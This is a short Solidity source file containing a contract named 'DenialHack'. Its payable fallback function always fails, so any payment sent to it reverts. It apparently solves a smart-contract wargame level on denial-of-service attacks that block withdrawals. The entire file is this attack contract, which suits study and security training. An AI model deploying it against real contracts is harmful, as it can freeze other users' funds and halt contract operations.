pragma solidity ^0.5.0;

contract DenialHack {

    function() external payable {
        assert(1 == 2);
    }

}
